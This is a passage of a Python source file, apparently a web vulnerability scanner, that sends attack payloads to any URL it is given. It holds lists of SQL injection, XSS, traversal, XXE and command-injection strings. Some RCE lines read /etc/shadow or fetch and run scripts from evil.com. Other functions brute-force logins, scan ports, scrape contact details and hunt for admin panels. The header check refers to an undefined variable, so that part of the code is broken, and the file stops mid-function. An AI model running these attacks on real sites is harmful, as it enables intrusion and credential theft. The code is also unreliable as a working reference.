import requests
import re
import socket
import time
import argparse
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import pandas as pd
from jinja2 import Environment, FileSystemLoader
import os
from dotenv import load_dotenv
import logging
import json
import sys 

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', stream=sys.stderr)

COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_CYAN = "\033[96m"
COLOR_RESET = "\033[0m"

DEFAULT_PREDEFINED_PASSWORDS = [
    '123456', 'password', '123456789', '12345678', '12345', '1234567',
    'qwerty', 'admin', 'user', 'test', '111111', '000000', 'root', 'guest',
    'pass', 'secret', '1234', 'admin123', 'welcome'
]
DEFAULT_GMAIL_PASSWORDS = [ 
    'password', '123456', 'qwerty', 'gmail123', 'googlepass'
]
DEFAULT_SQL_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'== '1",
    "' OR 'a'='a", "' OR ''=''",
    "' OR 1=1 --", "' OR 1=1 /*",
    "' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(user(),':',password(),':',database()) FROM mysql.user LIMIT 1) AS t) -- ", 
    "' UNION SELECT @@version, database() -- ", 
    "' UNION SELECT null, table_name FROM information_schema.tables -- ", 
    "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' -- ",
    "' AND 1=1 --", "' AND 1=2 --", 
    "' AND (SELECT COUNT(*) FROM information_schema.tables)=1 -- " 
]
DEFAULT_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'<script>alert('XSS')</script>'",
    '"<script>alert(\'XSS\')</script>"',
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload=alert('XSS')>",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>", 
    "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;>", # HTML Entity encoded
    "'';!--\"<XSS>=&{()}", 
    "<applet code='XSS.class'>", 
    "<math><ml><mtext id='xss' background='red' onclick='alert(1)'>ClickMe</mtext></ml></math>", # SVG/MathML based
    "<isindex action=javascript:alert('XSS')>", 
]
DEFAULT_RCE_PAYLOADS = [
    "system('ls')", "system('id')", "echo 'test_rce_payload'", "uname -a", "cat /etc/passwd", "cat /etc/shadow", # Linux sensitive files
    "type C:\\Windows\\System32\\drivers\\etc\\hosts", "ver", 
    "ping -c 4 google.com", 
    "wget http://evil.com/malicious.sh && bash malicious.sh",
    "curl http://evil.com/script.sh | bash", 
    "python -c 'import os; os.system(\"ls\")'" 
]
DEFAULT_DT_PAYLOADS = [
    "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", 
    "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", 
    "%252e%252e%252f..%252f..%252fetc%252fpasswd", 
    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", 
    "../../../../../../../../../../etc/passwd%00", 
    "WEB-INF/web.xml", 
    "WEB-INF/classes/com/example/config.properties" 
]
DEFAULT_RFI_URLS = ["http://example.com/malicious_file.txt"] 
DEFAULT_SSRF_URLS = ["http://127.0.0.1:8080", "http://localhost:8080", "http://[::1]:8080", "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/"] # Example cloud metadata endpoint
DEFAULT_OPEN_REDIRECT_URLS = ["http://malicious-redirect.com", "https://evil.com", "http://attacker.com/login"]
DEFAULT_XXE_PAYLOADS = [
    '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>', 
    '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><test>&xxe;</test>', 
    '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://evil.com/resource"> ]><test>&xxe;</test>',
    '<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd"> %dtd;', 
    '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "https://example.com/xxe.xml"> ]><foo>&xxe;</foo>' 
]
DEFAULT_CMD_INJECTION_PAYLOADS = [
    "; ls", "& dir", "| whoami", "`id`", "$(uname -a)", 
    "&& cat /etc/passwd", "|| echo pwned", "|| type C:\\Windows\\win.ini", 
    "$(ping -c 1 127.0.0.1)", 
    "'`id`'", '"`id`"',
]

test_results_data = [] 


def get_colored_status(status, is_vulnerable):
    if is_vulnerable:
        return f"{COLOR_RED}[ VULNERABLE ]{COLOR_RESET} {status}"
    else:
        return f"{COLOR_GREEN}[ SAFE ]{COLOR_RESET} {status}"

def log_info(message):
    logging.info(message)

def log_warning(message):
    logging.warning(message)

def log_error(message):
    logging.error(message)

def read_file_to_list(filepath):
    """Reads lines from a file, strips whitespace, filters empty lines, and returns unique lines."""
    if not filepath or not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
            return list(dict.fromkeys(lines)) 
    except Exception as e:
        log_error(f"Error reading file {filepath}: {e}")
        return []



def test_security(url, session): 
    results = []
    is_vulnerable = False
    status = "Initial check failed"
    try:
        response = session.get(url, timeout=10, allow_redirects=True)
        final_url = response.url 
        status_code = response.status_code
        results.append({"name": "HTTP Status Code", "value": str(status_code), "is_vulnerable": False})

        if final_url.startswith("https"):
            results.append({"name": "HTTPS Enabled", "value": "Yes", "is_vulnerable": False})
        else:
            results.append({"name": "HTTPS Enabled", "value": "No", "is_vulnerable": True})
            status = "HTTPS is not used on the final URL."
            is_vulnerable = True

        
        security_headers_checks = {
            'X-Content-Type-Options': {'NOSNIFF': False},
            'X-Frame-Options': {'DENY': True, 'SAMEORIGIN': True},
            'Strict-Transport-Security': {'MAX-AGE': True}, 
            'Content-Security-Policy': {'frame-ancestors': True, 'default-src': False}, 
            'X-XSS-Protection': {'1': False, '1; mode=block': False} 
        }
        
        header_details = []
        for header, checks in security_headers.items():
            header_value = response.headers.get(header, 'Not Present')
            is_header_vulnerable = True 
            
            if header_value != 'Not Present':
                upper_value = header_value.upper()
                if header == 'X-Frame-Options':
                    if upper_value in ['DENY', 'SAMEORIGIN']: is_header_vulnerable = False
                elif header == 'Strict-Transport-Security':                   
                    max_age_match = re.search(r'MAX-AGE=(\d+)', upper_value)
                    if max_age_match and int(max_age_match.group(1)) >= 31536000:
                         is_header_vulnerable = False
                elif header == 'X-XSS-Protection':
                     if upper_value in ['1', '1; MODE=BLOCK', '1; REPORT=URL']: is_header_vulnerable = False
                elif header == 'X-Content-Type-Options':
                     if upper_value == 'NOSNIFF': is_header_vulnerable = False
                elif header == 'Content-Security-Policy':
                     
                     if 'FRAME-ANCESTORS' in upper_value:
                          if "'*'" in upper_value or "'* '" in upper_value: 
                               is_header_vulnerable = True 
                          else: 
                               is_header_vulnerable = False 
                     elif 'DEFAULT-SRC' in upper_value: 
                           is_header_vulnerable = False 
                   
            header_details.append({"name": f"Header: {header}", "value": header_value, "is_vulnerable": is_header_vulnerable})
            if is_header_vulnerable:
                status += f" Missing or weak security header: {header}."
                is_vulnerable = True
        
        results.extend(header_details)

    except requests.exceptions.RequestException as e:
        status = f"Request failed: {e}"
        log_error(f"Error in test_security for {url}: {e}")
        is_vulnerable = True
    
    return {"test_name": "Basic Security Headers & HTTPS", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def extract_contact_info(url, session): 
    results = []
    emails = set()
    phones = set()
    is_vulnerable = False 
    status = "No contact info found."
    try:
        response = session.get(url, timeout=10, allow_redirects=True)
        if response.status_code == 200:
            text_content = response.text
            emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text_content))
           
            phone_regex = r'(?:\+?\d{1,3}[-.\s]?)?(?:\(?\d{3}\)?[-.\s]?)?\d{3}[-.\s]?\d{4}' 
            
            phone_regex_comprehensive = r'(\+?\d{1,3}[-.\s]?)?(\(?\d{2,3}\)?[-.\s]?)?(\d{3,4}[-.\s]?\d{3,4})'
            phones = set(re.findall(phone_regex_comprehensive, text_content))
            
            if emails or phones:
                status = "Contact information found."
                
            else:
                status = "No contact information found."
        else:
            status = f"Failed to retrieve content (Status: {response.status_code})"
            is_vulnerable = True
    except requests.exceptions.RequestException as e:
        status = f"Request failed: {e}"
        log_error(f"Error in extract_contact_info for {url}: {e}")
        is_vulnerable = True

    email_list = sorted(list(emails))
    
    phone_list = sorted([p.strip() for p in phones if p.strip()])

    details = []
    if email_list:
        details.append({"name": "Emails Found", "value": ", ".join(email_list), "is_vulnerable": False})
    if phone_list:
        details.append({"name": "Phone Numbers Found", "value": ", ".join(phone_list), "is_vulnerable": False})
    if not email_list and not phone_list and response.status_code == 200:
         details.append({"name": "Contact Info Status", "value": "No emails or phone numbers found.", "is_vulnerable": False})

    return {"test_name": "Extract Contact Info", "url": url, "status": status, "details": details, "is_vulnerable": is_vulnerable}

def scan_ports(url, session): 
    results = []
    open_ports = []
    is_vulnerable = False
    status = "No common open ports found."
    try:
        parsed_url = urlparse(url)
        target = parsed_url.hostname
        if not target:
            raise ValueError("Could not determine hostname from URL")

       
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 1521, 3306, 3389, 5432, 5900, 8000, 8080, 8443, 9090, 9443, 27017, 27018, 3389]
        
        
        common_ports.sort()
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5) 
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)

                
                status = f"Open port found: {port}."
                is_vulnerable = True 
            sock.close()
        
        if not open_ports:
             status = "No common open ports found."
             is_vulnerable = False
        else:
             status = f"Found open ports: {', '.join(map(str, open_ports))}"

        results.append({"name": "Open Ports (Common)", "value": ', '.join(map(str, open_ports)) if open_ports else "None", "is_vulnerable": is_vulnerable})

    except Exception as e:
        status = f"Error scanning ports: {e}"
        log_error(f"Error in scan_ports for {url}: {e}")
        is_vulnerable = True
        results.append({"name": "Port Scan Status", "value": status, "is_vulnerable": True})
        
    return {"test_name": "Port Scan (Common Ports)", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def extract_all_links(url, session): 
    results = []
    links = set()
    is_vulnerable = False
    status = "Could not extract links."
    try:
        response = session.get(url, timeout=10, allow_redirects=True)
        response.raise_for_status() 
        
        soup = BeautifulSoup(response.text, 'html.parser')
        base_url = response.url 

        
        for a_tag in soup.find_all('a', href=True):
            link = urljoin(base_url, a_tag['href'])
            
            parsed_link = urlparse(link)
            if parsed_link.scheme in ['http', 'https']:
                links.add(link)
        
        
        for tag in soup.find_all(['link', 'script', 'img', 'source', 'iframe', 'form']):
             href = tag.get('href')
             src = tag.get('src')
             action = tag.get('action')
             
             link_to_add = None
             if href: link_to_add = href
             elif src: link_to_add = src
             elif action: link_to_add = action 
             
             if link_to_add:
                  link = urljoin(base_url, link_to_add)
                  parsed_link = urlparse(link)
                  if parsed_link.scheme in ['http', 'https']: links.add(link)

        if links:
            status = f"Extracted {len(links)} unique HTTP/HTTPS links."
            is_vulnerable = False
        else:
            status = "No valid HTTP/HTTPS links found."
            is_vulnerable = False
            
        results.append({"name": "Total Links Found", "value": str(len(links)), "is_vulnerable": False})

    except requests.exceptions.RequestException as e:
        status = f"Request failed: {e}"
        log_error(f"Error in extract_all_links for {url}: {e}")
        is_vulnerable = True
    except Exception as e:
        status = f"Error parsing HTML: {e}"
        log_error(f"Error parsing HTML in extract_all_links for {url}: {e}")
        is_vulnerable = True

    return {"test_name": "Extract All Links", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable, "extracted_links": sorted(list(links))}

def identify_admin_panels(url, all_links=None, session=None): 
    results = []
    found_panels = []
    is_vulnerable = False
    status = "No common admin panels identified."
    
    admin_keywords = ['/admin', '/login', '/administrator', '/wp-admin', '/panel', '/dashboard', '/manage', '/phpmyadmin', '/cpanel', '/admin.php', '/admin_login.php', '/secure', '/console', '/system', '/auth', '/backend', '/control', '/manage', '/settings']
    
    try:
        if all_links is None:
             
             link_info = extract_all_links(url, session=session)
             if link_info['is_vulnerable'] and not link_info['extracted_links']:
                  status = link_info['status'] 
                  return {"test_name": "Identify Admin Panels", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}
             all_links = link_info.get('extracted_links', [])
        
        if not all_links:
             
             base_url_parts = urlparse(url)
             base_url = f"{base_url_parts.scheme}://{base_url_parts.netloc}"
             all_links.append(base_url) 

        checked_urls = set()
        
        
        potential_panel_urls = set()
        parsed_url = urlparse(url)
        base_site_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        potential_panel_urls.add(base_site_url) 
        
        for link in all_links:
            potential_panel_urls.add(link) 
            
            
            parsed_link = urlparse(link)
            link_domain = f"{parsed_link.scheme}://{parsed_link.netloc}"
            for keyword in admin_keywords:
                potential_panel_urls.add(urljoin(link_domain, keyword))

        
        urls_to_scan = sorted(list(potential_panel_urls))[:100] 

        for panel_url in urls_to_scan:
            if panel_url in checked_urls: continue
            checked_urls.add(panel_url)
            
            try:
                
                panel_response = session.get(panel_url, timeout=5, allow_redirects=False) 
                
              
                if panel_response.status_code in [200, 301, 302]:
                    response_text_lower = panel_response.text.lower() if panel_response.text else ""
                    path_lower = urlparse(panel_url).path.lower()
                    
                    
                    if any(keyword in path_lower for keyword in admin_keywords) or \
                       any(keyword in response_text_lower for keyword in ['username', 'password', 'login', 'admin', 'dashboard', 'manage', 'secure', 'authentication', 'control panel']):
                        
                        found_panels.append(panel_url)
                        status = f"Potential admin panel found: {panel_url}"
                        is_vulnerable = True
                        
                        
            except requests.exceptions.RequestException:
                continue 

        if not found_panels:
            status = "No common admin panels identified."
            is_vulnerable = False
        
        results.append({"name": "Admin Panels Found", "value": ", ".join(found_panels) if found_panels else "None", "is_vulnerable": is_vulnerable})

    except Exception as e:
        status = f"Error identifying admin panels: {e}"
        log_error(f"Error in identify_admin_panels for {url}: {e}")
        is_vulnerable = True
        results.append({"name": "Panel Identification Status", "value": status, "is_vulnerable": True})
        
    return {"test_name": "Identify Admin Panels", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def display_site_info(url, session): 
    results = []
    title, description, keywords = "N/A", "N/A", "N/A"
    is_vulnerable = False
    status = "Site info extracted."
    try:
        response = session.get(url, timeout=10, allow_redirects=True)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        title_tag = soup.title
        title = title_tag.string.strip() if title_tag else "Title not found"
        
        meta_description = soup.find("meta", attrs={"name": "description"})
        description = meta_description["content"].strip() if meta_description and meta_description.has_attr("content") else "Description not found"
        
        meta_keywords = soup.find("meta", attrs={"name": "keywords"})
        keywords = meta_keywords["content"].strip() if meta_keywords and meta_keywords.has_attr("content") else "Keywords not found"

        results.append({"name": "Page Title", "value": title, "is_vulnerable": False})
        results.append({"name": "Meta Description", "value": description, "is_vulnerable": False})
        results.append({"name": "Meta Keywords", "value": keywords, "is_vulnerable": False})

    except requests.exceptions.RequestException as e:
        status = f"Request failed: {e}"
        log_error(f"Error in display_site_info for {url}: {e}")
        is_vulnerable = True
    except Exception as e:
        status = f"Error parsing HTML: {e}"
        log_error(f"Error parsing HTML in display_site_info for {url}: {e}")
        is_vulnerable = True

    return {"test_name": "Display Site Info", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_passwords(url, username, password_list, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "Password test completed."
    
    
    login_url = urljoin(url, '/login') 
    hidden_fields = {}
    
    try:
        
        resp_login_page = session.get(urljoin(url, '/login'), timeout=10)
        resp_login_page.raise_for_status()
        soup = BeautifulSoup(resp_login_page.text, 'html.parser')
        login_form = soup.find('form')
        
        if login_form:
            action = login_form.get('action')
            if action:
                login_url = urljoin(url, action) 
            
            hidden_fields = {field.get('name'): field.get('value', '') for field in login_form.find_all('input', {'type': 'hidden'}) if field.get('name')}
            
            for name, value in hidden_fields.items():
                 if 'csrf' in name.lower() and value:
                      log_info(f"Found CSRF token '{name}' in login form.")
        else:
            log_warning(f"No login form found at {urljoin(url, '/login')}. Assuming default login path and no hidden fields.")

    except requests.exceptions.RequestException as e:
        log_warning(f"Could not fetch login page {urljoin(url, '/login')} to find form details: {e}. Proceeding with default '/login'.")
        hidden_fields = {} 

    
    for password in password_list:
        post_data = {'username': username, 'password': password}
        post_data.update(hidden_fields) 

        try:
            response = session.post(login_url, data=post_data, timeout=10)
            
            
            is_login_success = False
            response_text_lower = response.text.lower() if response.text else ""

            if response.status_code == 200:
                
                if any(kw in response_text_lower for kw in ['welcome', 'dashboard', 'profile', 'logout', 'success']) and \
                   not any(kw in response_text_lower for kw in ['invalid', 'failed', 'error', 'incorrect', 'wrong', 'denied']):
                    is_login_success = True
            elif response.status_code in [302, 301]: 
                 redirect_location = response.headers.get('Location', '').lower()
                 if any(kw in redirect_location for kw in ['dashboard', 'profile', 'home', 'success']):
                      is_login_success = True

            if is_login_success:
                results.append({"name": f"Username: {username}, Password: {password}", "value": "Login Successful!", "is_vulnerable": True})
                status = f"Found valid password for {username}: {password}"
                is_vulnerable = True
                break 
            else:
                results.append({"name": f"Username: {username}, Password: {password}", "value": "Login Failed.", "is_vulnerable": False})
        
        except requests.exceptions.RequestException as e:
            log_error(f"Error testing password '{password}' for user '{username}' at {login_url}: {e}")
            results.append({"name": f"Username: {username}, Password: {password}", "value": f"Request Error: {e}", "is_vulnerable": False})
            

    if not is_vulnerable:
        status = f"No valid password found for {username} using the provided list and login path '{login_url}'."

    return {"test_name": "Test Login Credentials (Brute-Force)", "url": login_url, "status": status, "details": results, "is_vulnerable": is_vulnerable}



def test_sql_injection(url, payload_list, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "SQL Injection test completed. No vulnerabilities detected with given payloads."
    
    
    param_names_get = ['id', 'page', 'cat', 'item', 'search', 'query', 'user', 'file', 'view', 'param', 'input', 'url', 'redirect', 'callback']
    param_names_post = ['username', 'password', 'email', 'search', 'query', 'comment', 'data', 'input', 'message', 'content', 'xml', 'payload']
    
    
    post_target_url = kwargs.get('data_url', url) 
    if not urlparse(post_target_url).scheme: 
         post_target_url = urljoin(url, post_target_url)

    
    for param in param_names_get:
        for payload in payload_list:
            try:
                test_url = f"{url}?{param}={requests.utils.quote(payload)}" 
                response = session.get(test_url, timeout=10)
                
                response_text_lower = response.text.lower() if response.text else ""
                
                
                if response.status_code == 200 and \
                   (any(err in response_text_lower for err in ['sql syntax error', 'mysql_fetch_array()', 'unclosed quotation mark', 'odbc driver', 'ora-01756', 'microsoft ole db provider for odbc drivers', 'pg::error', 'sqlite error']) or \
                    "You have an error in your SQL syntax" in response.text): 
                    
                    results.append({"name": f"SQLi (GET) via param '{param}'", "value": f"Vulnerable URL: {test_url}", "payload": payload, "is_vulnerable": True})
                    status = f"SQL Injection vulnerability detected via GET parameter '{param}'."
                    is_vulnerable = True
                    break 
                
                
                if "union select" in payload.lower() and response.status_code == 200:
                    
                    if any(indicator in response_text_lower for indicator in ['version', 'database', 'table', 'column', 'user', 'pass', ':']):
                         results.append({"name": f"SQLi (UNION) via param '{param}'", "value": f"Potential data exfiltration: {test_url}", "payload": payload, "is_vulnerable": True})
                         status = f"Potential data exfiltration via UNION-based SQL Injection on GET parameter '{param}'."
                         is_vulnerable = True
                         break

            except requests.exceptions.RequestException as e:
                log_error(f"Error testing SQLi GET with payload '{payload}' on param '{param}' for {url}: {e}")
                
        if is_vulnerable and results and results[-1]['is_vulnerable']: break 

    
    if kwargs.get('data_url') or urlparse(url).path.endswith(('/login', '/submit', '/process', '/search', '/comment', '/post', '/api')): # Heuristic for POST target
         for param in param_names_post:
              for payload in payload_list:
                   try:
                        
                        post_data = {param: payload}
                        if 'hidden_fields' in kwargs and kwargs['hidden_fields']:
                             post_data.update(kwargs['hidden_fields']) 

                        response = session.post(post_target_url, data=post_data, timeout=10)
                        response_text_lower = response.text.lower() if response.text else ""

                        if response.status_code == 200 and \
                           (any(err in response_text_lower for err in ['sql syntax error', 'mysql_fetch_array()', 'unclosed quotation mark', 'pg::error', 'sqlite error'])):
                            results.append({"name": f"SQLi (POST) via param '{param}'", "value": f"Vulnerable URL: {post_target_url}", "payload": payload, "is_vulnerable": True})
                            status = f"SQL Injection vulnerability detected via POST parameter '{param}'."
                            is_vulnerable = True
                            break
                   except requests.exceptions.RequestException as e:
                        log_error(f"Error testing SQLi POST with payload '{payload}' on param '{param}' for {post_target_url}: {e}")
              if is_vulnerable and results and results[-1]['is_vulnerable']: break

    if not is_vulnerable:
        status = "SQL Injection test completed. No vulnerabilities detected with given payloads and parameters."
    
    return {"test_name": "SQL Injection", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_xss(url, payload_list, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "XSS test completed. No Reflected XSS vulnerabilities detected."
    
    param_names = ['q', 'search', 'query', 'input', 'redirect', 'callback', 'data', 'msg', 'name', 'comment', 'term', 'keyword', 'text']
    
    post_target_url = kwargs.get('data_url', url)
    if not urlparse(post_target_url).scheme:
         post_target_url = urljoin(url, post_target_url)

    
    for param in param_names:
        for payload in payload_list:
            try:
                test_url = f"{url}?{param}={requests.utils.quote(payload)}"
                response = session.get(test_url, timeout=10)
                
               
                if response.status_code == 200 and payload in response.text:
                    results.append({"name": f"Reflected XSS via param '{param}'", "value": f"Vulnerable URL: {test_url}", "payload": payload, "is_vulnerable": True})
                    status = f"Reflected XSS vulnerability detected via GET parameter '{param}'."
                    is_vulnerable = True
                    break 
            except requests.exceptions.RequestException as e:
                log_error(f"Error testing XSS GET with payload '{payload}' on param '{param}' for {url}: {e}")
        if is_vulnerable and results and results[-1]['is_vulnerable']: break
            
    
    if kwargs.get('data_url') or urlparse(url).path.endswith(('/search', '/comment', '/post', '/api')):
         for param in param_names:
              for payload in payload_list:
                   try:
                        post_data = {param: payload}
                        if 'hidden_fields' in kwargs and kwargs['hidden_fields']: post_data.update(kwargs['hidden_fields'])
                        
                        response = session.post(post_target_url, data=post_data, timeout=10)
                        if response.status_code == 200 and payload in response.text: 
                             results.append({"name": f"Reflected XSS via POST param '{param}'", "value": f"Vulnerable URL: {post_target_url}", "payload": payload, "is_vulnerable": True})
                             status = f"Reflected XSS vulnerability detected via POST parameter '{param}'."
                             is_vulnerable = True
                             break
                   except requests.exceptions.RequestException as e:
                        log_error(f"Error testing XSS POST with payload '{payload}' on param '{param}' for {post_target_url}: {e}")
              if is_vulnerable and results and results[-1]['is_vulnerable']: break

        
    if not is_vulnerable:
        status = "XSS test completed. No Reflected XSS vulnerabilities detected with given payloads and parameters."

    return {"test_name": "Cross-Site Scripting (XSS)", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_csrf(url, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "CSRF test completed. No obvious vulnerabilities detected with basic checks."
    
    
    
    try:
        
        response = session.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        actionable_forms = []
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'GET').upper()
           
            if method == 'POST' and action:
                 form_url = urljoin(url, action)
                 
                 if '/login' not in form_url.lower():
                     
                      form_inputs = {input_tag.get('name'): input_tag.get('value', '') 
                                     for input_tag in form.find_all('input', {'name': True})}
                      actionable_forms.append({'url': form_url, 'method': method, 'inputs': form_inputs})

       
        if not actionable_forms:
            actionable_forms.append({'url': urljoin(url, '/submit'), 'method': 'POST', 'inputs': {'csrf_test_param': 'value'}})

        for form_info in actionable_forms:
            form_url = form_info['url']
            base_inputs = form_info['inputs']
            
           
            csrf_token_name = None
            csrf_token_value = None
            for name, value in base_inputs.items():
                 if 'csrf' in name.lower() or 'token' in name.lower() or 'authenticity' in name.lower():
                      csrf_token_name = name
                      csrf_token_value = value
                      log_info(f"Found potential CSRF token '{name}' with value '{value}'.")
                      break
            
           
            test_data = base_inputs.copy()
            test_data['test_field'] = 'test_value' 

           
            if csrf_token_name and csrf_token_value:
                test_data[csrf_token_name] = csrf_token_value
                try:
                    response_valid = session.post(form_url, data=test_data, timeout=10)
                   
                    if response_valid.status_code not in [403, 400] and "csrf" not in (response_valid.text.lower() if response_valid.text else ""):
                         log_info(f"Submission to {form_url} with valid token appears successful.")
                    else:
                         log_warning(f"Submission to {form_url} with valid token returned CSRF error.")
                except requests.exceptions.RequestException as e:
                    log_warning(f"Error during valid CSRF submission to {form_url}: {e}")
            
          
            tampered_data = base_inputs.copy()
            tampered_data['test_field'] = 'tampered_value'
            if csrf_token_name:
                 tampered_data[csrf_token_name] = 'invalid_or_tampered_token' 
            
            try:
                response_invalid = session.post(form_url, data=tampered_data, timeout=10)
                
                
                if response_invalid.status_code in [403, 400] or \
                   ("csrf" in (response_invalid.text.lower() if response_invalid.text else "") and \
                    ("invalid token" in (response_invalid.text.lower()) or "required" in (response_invalid.text.lower()))):
                     
                     results.append({"name": f"CSRF Check on {form_url}", "value": "CSRF protection seems effective (Error on invalid token).", "is_vulnerable": False})
                else:
                     
                     results.append({"name": f"CSRF Check on {form_url}", "value": "Potential CSRF vulnerability: No CSRF error detected on invalid token submission.", "is_vulnerable": True})
                     status = f"Potential CSRF vulnerability detected on {form_url}."
                     is_vulnerable = True
                     break 

            except requests.exceptions.RequestException as e:
                 log_error(f"Error during invalid CSRF submission to {form_url}: {e}")
                 results.append({"name": f"CSRF Check on {form_url}", "value": f"Request error: {e}", "is_vulnerable": True})
                 is_vulnerable = True
                 break 

    except requests.exceptions.RequestException as e:
        log_error(f"Error accessing {url} for CSRF form analysis: {e}")
        status = f"Error accessing URL for CSRF analysis: {e}"
        is_vulnerable = True
        results.append({"name": "CSRF Analysis Status", "value": status, "is_vulnerable": True})
        
    return {"test_name": "Cross-Site Request Forgery (CSRF)", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_directory_traversal(url, payload_list, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "Directory Traversal test completed. No vulnerabilities detected."
    
    param_names = ['file', 'path', 'document', 'include', 'page', 'view', 'get', 'load', 'template', 'data', 'source', 'uri', 'url']
    
    post_target_url = kwargs.get('data_url', url)
    if not urlparse(post_target_url).scheme:
         post_target_url = urljoin(url, post_target_url)

    
    for param in param_names:
        for payload in payload_list:
            try:
               
                encoded_payload = requests.utils.quote(payload)
                test_url = f"{url}?{param}={encoded_payload}"
                
                response = session.get(test_url, timeout=10)
                
               
                response_text_lower = response.text.lower() if response.text else ""
                if response.status_code == 200 and \
                   ('root:' in response_text_lower or 'bin/bash' in response_text_lower or 'systemroot' in response_text_lower or 'c:\\windows' in response_text_lower or '<!doctype html>' not in response_text_lower): # Check for file content or absence of normal HTML
                    
                    results.append({"name": f"Directory Traversal via param '{param}'", "value": f"Vulnerable URL: {test_url}", "payload": payload, "is_vulnerable": True})
                    status = f"Directory Traversal vulnerability detected via GET parameter '{param}'."
                    is_vulnerable = True
                    break
            except requests.exceptions.RequestException as e:
                log_error(f"Error testing Directory Traversal with payload '{payload}' on param '{param}' for {url}: {e}")
        if is_vulnerable and results and results[-1]['is_vulnerable']: break

    
    if kwargs.get('data_url') or urlparse(url).path.endswith(('/file', '/load', '/view', '/resource')): 
         for param in param_names:
              for payload in payload_list:
                   try:
                        post_data = {param: payload}
                        if 'hidden_fields' in kwargs and kwargs['hidden_fields']: post_data.update(kwargs['hidden_fields'])
                        
                        response = session.post(post_target_url, data=post_data, timeout=10)
                        response_text_lower = response.text.lower() if response.text else ""
                        if response.status_code == 200 and \
                           ('root:' in response_text_lower or 'systemroot' in response_text_lower):
                             results.append({"name": f"Directory Traversal via POST param '{param}'", "value": f"Vulnerable URL: {post_target_url}", "payload": payload, "is_vulnerable": True})
                             status = f"Directory Traversal vulnerability detected via POST parameter '{param}'."
                             is_vulnerable = True
                             break
                   except requests.exceptions.RequestException as e:
                        log_error(f"Error testing DT POST with payload '{payload}' on param '{param}' for {post_target_url}: {e}")
              if is_vulnerable and results and results[-1]['is_vulnerable']: break

    if not is_vulnerable:
        status = "Directory Traversal test completed. No vulnerabilities detected with given payloads and parameters."
        
    return {"test_name": "Directory Traversal", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_remote_file_inclusion(url, rfi_urls, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "Remote File Inclusion test completed. No vulnerabilities detected."
    
    param_names = ['file', 'include', 'page', 'path', 'require', 'view', 'document', 'content', 'template', 'data']
    
    post_target_url = kwargs.get('data_url', url)
    if not urlparse(post_target_url).scheme:
         post_target_url = urljoin(url, post_target_url)

   
    for param in param_names:
        for rfi_target in rfi_urls:
            try:
                
                test_url = f"{url}?{param}={requests.utils.quote(rfi_target)}"
                response = session.get(test_url, timeout=10)
                
                
                if response.status_code == 200 and "rfi_test_success_marker" in (response.text.lower() if response.text else ""): 
                    results.append({"name": f"RFI via param '{param}'", "value": f"Vulnerable URL: {test_url}", "rfi_url": rfi_target, "is_vulnerable": True})
                    status = f"Remote File Inclusion vulnerability detected via GET parameter '{param}'."
                    is_vulnerable = True
                    break
            except requests.exceptions.RequestException as e:
                log_error(f"Error testing RFI GET with URL '{rfi_target}' on param '{param}' for {url}: {e}")
        if is_vulnerable and results and results[-1]['is_vulnerable']: break
        
    
    if kwargs.get('data_url') or urlparse(url).path.endswith(('/include', '/require', '/load', '/page')): 
         for param in param_names:
              for rfi_target in rfi_urls:
                   try:
                        post_data = {param: rfi_target}
